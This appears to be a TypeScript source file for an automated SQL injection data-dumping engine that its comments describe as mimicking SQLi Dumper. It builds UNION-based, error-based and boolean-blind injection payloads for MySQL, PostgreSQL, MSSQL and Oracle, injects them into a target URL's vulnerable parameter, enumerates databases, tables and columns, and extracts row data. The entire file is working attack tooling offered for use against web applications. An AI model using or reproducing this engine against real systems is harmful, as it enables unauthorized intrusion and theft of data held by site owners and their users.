import { makeRequest, RequestResult, sleep } from "./utils";
import { InsertExtractedDatabase, InsertExtractedTable, InsertExtractedColumn, InsertExtractedData, InsertDumpingJob } from "@shared/schema";

type DatabaseType = "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite" | "unknown";
type ExtractionTechnique = "error-based" | "union-based" | "boolean-based" | "time-based";

interface DumpingContext {
  targetUrl: string;
  vulnerableParameter: string;
  dbType: DatabaseType;
  technique: ExtractionTechnique;
  injectionPoint: string; // The exact payload structure
  signal: AbortSignal;
  onProgress?: (progress: number, message: string) => void;
  onLog?: (level: string, message: string) => Promise<void>;
}

interface DatabaseInfo {
  name: string;
  version?: string;
  user?: string;
  currentDb?: string;
}

interface TableInfo {
  name: string;
  database: string;
}

interface ColumnInfo {
  name: string;
  type: string;
  isNullable: boolean;
  key: string;
  default: string;
  extra: string;
}

/**
 * Advanced Data Dumping Engine
 * Extracts databases, tables, columns, and data using various SQLi techniques
 * Mimics SQLi Dumper functionality with adaptive extraction strategies
 */
export class DataDumpingEngine {
  private context: DumpingContext;
  private requestDelay = 100; // ms between requests
  private maxRetries = 3;
  private concurrency = 5; // Parallel extraction threads
  private extractedCount = 0;

  constructor(context: DumpingContext) {
    this.context = context;
  }

  /**
   * Main entry point: Full database dump
   */
  async dumpAll(): Promise<{
    databases: DatabaseInfo[];
    success: boolean;
    error?: string;
  }> {
    try {
      await this.log("info", "Starting full database dump...");
      
      // Step 1: Get current database info
      const currentDbInfo = await this.getCurrentDatabaseInfo();
      await this.log("info", `Current database: ${currentDbInfo.currentDb || 'unknown'}`);
      
      // Step 2: Enumerate all databases
      const databases = await this.enumerateDatabases();
      await this.log("info", `Found ${databases.length} databases`);
      
      return {
        databases,
        success: true,
      };
    } catch (error: any) {
      await this.log("error", `Dumping failed: ${error.message}`);
      return {
        databases: [],
        success: false,
        error: error.message,
      };
    }
  }

  /**
   * Get current database information
   */
  async getCurrentDatabaseInfo(): Promise<DatabaseInfo> {
    const queries = this.getInfoQueries(this.context.dbType);
    
    let info: DatabaseInfo = { name: "unknown" };
    
    try {
      // Try to get database name
      if (queries.currentDb) {
        const dbName = await this.extractValue(queries.currentDb);
        if (dbName) info.currentDb = dbName;
      }
      
      // Try to get user
      if (queries.user) {
        const user = await this.extractValue(queries.user);
        if (user) info.user = user;
      }
      
      // Try to get version
      if (queries.version) {
        const version = await this.extractValue(queries.version);
        if (version) info.version = version;
      }
      
      info.name = info.currentDb || "unknown";
    } catch (error: any) {
      await this.log("warn", `Could not get full database info: ${error.message}`);
    }
    
    return info;
  }

  /**
   * Enumerate all databases
   */
  async enumerateDatabases(): Promise<DatabaseInfo[]> {
    const queries = this.getEnumerationQueries(this.context.dbType);
    
    if (!queries.databases) {
      await this.log("warn", "Database enumeration not supported for this DB type");
      return [];
    }
    
    try {
      const count = await this.extractCount(queries.databases.count);
      await this.log("info", `Database count: ${count}`);
      
      const databases: DatabaseInfo[] = [];
      
      // Extract database names one by one
      for (let i = 0; i < count; i++) {
        if (this.context.signal.aborted) break;
        
        const dbName = await this.extractValue(
          queries.databases.enumerate.replace("{INDEX}", i.toString())
        );
        
        if (dbName && dbName !== "information_schema" && dbName !== "performance_schema") {
          databases.push({ name: dbName });
          await this.log("info", `Found database: ${dbName}`);
        }
        
        this.updateProgress(((i + 1) / count) * 100, `Enumerating databases: ${i + 1}/${count}`);
        await sleep(this.requestDelay);
      }
      
      return databases;
    } catch (error: any) {
      await this.log("error", `Database enumeration failed: ${error.message}`);
      return [];
    }
  }

  /**
   * Enumerate tables in a database
   */
  async enumerateTables(databaseName: string): Promise<TableInfo[]> {
    const queries = this.getEnumerationQueries(this.context.dbType);
    
    if (!queries.tables) {
      await this.log("warn", "Table enumeration not supported");
      return [];
    }
    
    try {
      const countQuery = queries.tables.count.replace("{DATABASE}", databaseName);
      const count = await this.extractCount(countQuery);
      await this.log("info", `Table count in ${databaseName}: ${count}`);
      
      const tables: TableInfo[] = [];
      
      for (let i = 0; i < count; i++) {
        if (this.context.signal.aborted) break;
        
        const tableName = await this.extractValue(
          queries.tables.enumerate
            .replace("{DATABASE}", databaseName)
            .replace("{INDEX}", i.toString())
        );
        
        if (tableName) {
          tables.push({ name: tableName, database: databaseName });
          await this.log("info", `Found table: ${tableName}`);
        }
        
        this.updateProgress(((i + 1) / count) * 100, `Enumerating tables: ${i + 1}/${count}`);
        await sleep(this.requestDelay);
      }
      
      return tables;
    } catch (error: any) {
      await this.log("error", `Table enumeration failed: ${error.message}`);
      return [];
    }
  }

  /**
   * Enumerate columns in a table
   */
  async enumerateColumns(databaseName: string, tableName: string): Promise<ColumnInfo[]> {
    const queries = this.getEnumerationQueries(this.context.dbType);
    
    if (!queries.columns) {
      await this.log("warn", "Column enumeration not supported");
      return [];
    }
    
    try {
      const countQuery = queries.columns.count
        .replace("{DATABASE}", databaseName)
        .replace("{TABLE}", tableName);
      const count = await this.extractCount(countQuery);
      await this.log("info", `Column count in ${tableName}: ${count}`);
      
      const columns: ColumnInfo[] = [];
      
      for (let i = 0; i < count; i++) {
        if (this.context.signal.aborted) break;
        
        const columnName = await this.extractValue(
          queries.columns.enumerate
            .replace("{DATABASE}", databaseName)
            .replace("{TABLE}", tableName)
            .replace("{INDEX}", i.toString())
        );
        
        if (columnName) {
          // Get column type if available
          let columnType = "unknown";
          if (queries.columns.type) {
            columnType = await this.extractValue(
              queries.columns.type
                .replace("{DATABASE}", databaseName)
                .replace("{TABLE}", tableName)
                .replace("{COLUMN}", columnName)
            ) || "unknown";
          }
          
          columns.push({
            name: columnName,
            type: columnType,
            isNullable: false,
            key: "",
            default: "",
            extra: "",
          });
          await this.log("info", `Found column: ${columnName} (${columnType})`);
        }
        
        this.updateProgress(((i + 1) / count) * 100, `Enumerating columns: ${i + 1}/${count}`);
        await sleep(this.requestDelay);
      }
      
      return columns;
    } catch (error: any) {
      await this.log("error", `Column enumeration failed: ${error.message}`);
      return [];
    }
  }

  /**
   * Extract data from a table
   */
  async extractTableData(
    databaseName: string,
    tableName: string,
    columns: string[],
    limit: number = 100
  ): Promise<Record<string, any>[]> {
    try {
      // Get row count
      const rowCountQuery = this.buildCountQuery(databaseName, tableName);
      const totalRows = await this.extractCount(rowCountQuery);
      const rowsToExtract = Math.min(totalRows, limit);
      
      await this.log("info", `Extracting ${rowsToExtract} rows from ${tableName}...`);
      
      const rows: Record<string, any>[] = [];
      
      for (let i = 0; i < rowsToExtract; i++) {
        if (this.context.signal.aborted) break;
        
        const row: Record<string, any> = {};
        
        // Extract each column value for this row
        for (const column of columns) {
          const value = await this.extractValue(
            this.buildDataQuery(databaseName, tableName, column, i)
          );
          row[column] = value || null;
        }
        
        rows.push(row);
        this.updateProgress(((i + 1) / rowsToExtract) * 100, `Extracting data: ${i + 1}/${rowsToExtract}`);
        await sleep(this.requestDelay);
      }
      
      await this.log("info", `Successfully extracted ${rows.length} rows`);
      return rows;
    } catch (error: any) {
      await this.log("error", `Data extraction failed: ${error.message}`);
      return [];
    }
  }

  /**
   * Extract a single value using the configured technique
   */
  private async extractValue(query: string): Promise<string | null> {
    const technique = this.context.technique;
    
    switch (technique) {
      case "union-based":
        return this.extractValueUnion(query);
      case "error-based":
        return this.extractValueError(query);
      case "boolean-based":
        return this.extractValueBoolean(query);
      case "time-based":
        return this.extractValueTime(query);
      default:
        // Try union first, fallback to error
        return (await this.extractValueUnion(query)) || (await this.extractValueError(query));
    }
  }

  /**
   * UNION-based extraction
   */
  private async extractValueUnion(query: string): Promise<string | null> {
    try {
      // Build UNION payload
      const payload = this.buildUnionPayload(query);
      const url = this.injectPayload(payload);
      
      const result = await makeRequest(url, {
        signal: this.context.signal,
        maxRedirects: 5,
      });
      
      if (result.error || result.status >= 400) return null;
      
      // Extract value from response using markers
      const match = result.body.match(/~~SQLIDUMPER~~(.+?)~~SQLIDUMPER~~/);
      if (match) return match[1];
      
      // Fallback: look for visible output
      return this.extractFromHTML(result.body);
    } catch (error) {
      return null;
    }
  }

  /**
   * Error-based extraction
   */
  private async extractValueError(query: string): Promise<string | null> {
    try {
      const payload = this.buildErrorPayload(query);
      const url = this.injectPayload(payload);
      
      const result = await makeRequest(url, {
        signal: this.context.signal,
        maxRedirects: 5,
      });
      
      if (result.error || result.status >= 400) return null;
      
      // Extract from error messages
      const patterns = [
        /Duplicate entry '(.+?)' for key/i,
        /XPATH syntax error: '(.+?)'/i,
        /conversion failed when converting.*?'(.+?)'/i,
        /"(.+?)".*?for key/i,
      ];
      
      for (const pattern of patterns) {
        const match = result.body.match(pattern);
        if (match) return match[1];
      }
      
      return null;
    } catch (error) {
      return null;
    }
  }

  /**
   * Boolean-based extraction (character by character)
   */
  private async extractValueBoolean(query: string): Promise<string | null> {
    try {
      // First, get the length
      const lengthQuery = `LENGTH((${query}))`;
      const length = await this.extractLengthBoolean(lengthQuery);
      
      if (length === 0) return null;
      
      let result = "";
      
      // Extract character by character
      for (let pos = 1; pos <= length; pos++) {
        if (this.context.signal.aborted) break;
        
        const char = await this.extractCharBoolean(query, pos);
        if (char) result += char;
        
        await sleep(this.requestDelay);
      }
      
      return result || null;
    } catch (error) {
      return null;
    }
  }

  /**
   * Time-based extraction (similar to boolean but slower)
   */
  private async extractValueTime(query: string): Promise<string | null> {
    // Time-based is very slow, only use for critical data
    // Implementation similar to boolean but with time delays
    await this.log("warn", "Time-based extraction is very slow, consider using another technique");
    return this.extractValueBoolean(query); // Fallback to boolean logic
  }

  /**
   * Extract count of items
   */
  private async extractCount(query: string): Promise<number> {
    const countStr = await this.extractValue(query);
    return countStr ? parseInt(countStr) || 0 : 0;
  }

  /**
   * Extract length using boolean technique
   */
  private async extractLengthBoolean(lengthQuery: string): Promise<number> {
    // Binary search for length
    let min = 0;
    let max = 1000; // Reasonable max length
    
    while (min < max) {
      const mid = Math.floor((min + max + 1) / 2);
      const payload = `${this.context.injectionPoint} AND (${lengthQuery})>=${mid}`;
      const url = this.injectPayload(payload);
      
      const result = await makeRequest(url, { signal: this.context.signal });
      const isTrue = this.checkBooleanResponse(result);
      
      if (isTrue) {
        min = mid;
      } else {
        max = mid - 1;
      }
      
      await sleep(this.requestDelay);
    }
    
    return min;
  }

  /**
   * Extract single character using boolean technique
   */
  private async extractCharBoolean(query: string, position: number): Promise<string | null> {
    // Binary search for ASCII value
    let min = 32;
    let max = 126;
    
    while (min < max) {
      const mid = Math.floor((min + max + 1) / 2);
      const payload = `${this.context.injectionPoint} AND ASCII(SUBSTRING((${query}),${position},1))>=${mid}`;
      const url = this.injectPayload(payload);
      
      const result = await makeRequest(url, { signal: this.context.signal });
      const isTrue = this.checkBooleanResponse(result);
      
      if (isTrue) {
        min = mid;
      } else {
        max = mid - 1;
      }
      
      await sleep(this.requestDelay);
    }
    
    return min >= 32 && min <= 126 ? String.fromCharCode(min) : null;
  }

  /**
   * Build payloads for different techniques
   */
  private buildUnionPayload(query: string): string {
    const dbType = this.context.dbType;
    
    // Detect number of columns (assume pre-detected)
    const columnCount = 5; // Default, should be detected
    const nulls = Array(columnCount - 1).fill("NULL").join(",");
    
    return `${this.context.injectionPoint} UNION ALL SELECT ${nulls},CONCAT('~~SQLIDUMPER~~',(${query}),'~~SQLIDUMPER~~')`;
  }

  private buildErrorPayload(query: string): string {
    const dbType = this.context.dbType;
    
    if (dbType === "mysql") {
      return `${this.context.injectionPoint} AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((${query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)`;
    } else if (dbType === "mssql") {
      return `${this.context.injectionPoint} AND 1=CAST((${query}) AS int)`;
    } else {
      // Generic error-based
      return `${this.context.injectionPoint} AND EXTRACTVALUE(1,CONCAT(0x7e,(${query})))`;
    }
  }

  private buildCountQuery(database: string, table: string): string {
    return `SELECT COUNT(*) FROM ${database}.${table}`;
  }

  private buildDataQuery(database: string, table: string, column: string, rowIndex: number): string {
    return `SELECT ${column} FROM ${database}.${table} LIMIT ${rowIndex},1`;
  }

  /**
   * Inject payload into target URL
   */
  private injectPayload(payload: string): string {
    const url = new URL(this.context.targetUrl);
    url.searchParams.set(this.context.vulnerableParameter, payload);
    return url.toString();
  }

  /**
   * Check if boolean response indicates TRUE
   */
  private checkBooleanResponse(result: RequestResult): boolean {
    // Compare with baseline to determine if condition is true
    // This should be pre-calibrated with known true/false responses
    // For now, use simple heuristic
    return !result.error && result.status === 200 && result.body.length > 1000;
  }

  /**
   * Extract value from HTML response
   */
  private extractFromHTML(html: string): string | null {
    // Remove HTML tags and look for data
    const text = html.replace(/<[^>]+>/g, " ");
    const match = text.match(/\b[a-zA-Z0-9_]{3,50}\b/);
    return match ? match[0] : null;
  }

  /**
   * Get SQL queries for different database types
   */
  private getInfoQueries(dbType: DatabaseType): Record<string, string> {
    const queries: Record<string, Record<string, string>> = {
      mysql: {
        currentDb: "SELECT database()",
        user: "SELECT user()",
        version: "SELECT version()",
      },
      postgresql: {
        currentDb: "SELECT current_database()",
        user: "SELECT current_user",
        version: "SELECT version()",
      },
      mssql: {
        currentDb: "SELECT DB_NAME()",
        user: "SELECT SYSTEM_USER",
        version: "SELECT @@version",
      },
      oracle: {
        currentDb: "SELECT ora_database_name FROM dual",
        user: "SELECT USER FROM dual",
        version: "SELECT banner FROM v$version WHERE rownum=1",
      },
      sqlite: {
        version: "SELECT sqlite_version()",
      },
    };
    
    return queries[dbType] || queries.mysql;
  }

  private getEnumerationQueries(dbType: DatabaseType): any {
    const queries: Record<string, any> = {
      mysql: {
        databases: {
          count: "SELECT COUNT(DISTINCT schema_name) FROM information_schema.schemata",
          enumerate: "SELECT schema_name FROM information_schema.schemata LIMIT {INDEX},1",
        },
        tables: {
          count: "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='{DATABASE}'",
          enumerate: "SELECT table_name FROM information_schema.tables WHERE table_schema='{DATABASE}' LIMIT {INDEX},1",
        },
        columns: {
          count: "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{DATABASE}' AND table_name='{TABLE}'",
          enumerate: "SELECT column_name FROM information_schema.columns WHERE table_schema='{DATABASE}' AND table_name='{TABLE}' LIMIT {INDEX},1",
          type: "SELECT data_type FROM information_schema.columns WHERE table_schema='{DATABASE}' AND table_name='{TABLE}' AND column_name='{COLUMN}'",
        },
      },
      postgresql: {
        databases: {
          count: "SELECT COUNT(datname) FROM pg_database WHERE datistemplate=false",
          enumerate: "SELECT datname FROM pg_database WHERE datistemplate=false LIMIT 1 OFFSET {INDEX}",
        },
        tables: {
          count: "SELECT COUNT(tablename) FROM pg_tables WHERE schemaname='public'",
          enumerate: "SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET {INDEX}",
        },
        columns: {
          count: "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{TABLE}'",
          enumerate: "SELECT column_name FROM information_schema.columns WHERE table_name='{TABLE}' LIMIT 1 OFFSET {INDEX}",
          type: "SELECT data_type FROM information_schema.columns WHERE table_name='{TABLE}' AND column_name='{COLUMN}'",
        },
      },
      mssql: {
        databases: {
          count: "SELECT COUNT(name) FROM sys.databases",
          enumerate: "SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name) AS rn, name FROM sys.databases) AS t WHERE rn={INDEX}+1",
        },
        tables: {
          count: "SELECT COUNT(name) FROM {DATABASE}.sys.tables",
          enumerate: "SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name) AS rn, name FROM {DATABASE}.sys.tables) AS t WHERE rn={INDEX}+1",
        },
        columns: {
          count: "SELECT COUNT(name) FROM {DATABASE}.sys.columns WHERE object_id=OBJECT_ID('{DATABASE}.dbo.{TABLE}')",
          enumerate: "SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name) AS rn, name FROM {DATABASE}.sys.columns WHERE object_id=OBJECT_ID('{DATABASE}.dbo.{TABLE}')) AS t WHERE rn={INDEX}+1",
        },
      },
    };
    
    return queries[dbType] || queries.mysql;
  }

  /**
   * Progress callback
   */
  private updateProgress(progress: number, message: string): void {
    if (this.context.onProgress) {
      this.context.onProgress(Math.round(progress), message);
    }
  }

  /**
   * Logging callback
   */
  private async log(level: string, message: string): Promise<void> {
    if (this.context.onLog) {
      await this.context.onLog(level, message);
    }
  }
}
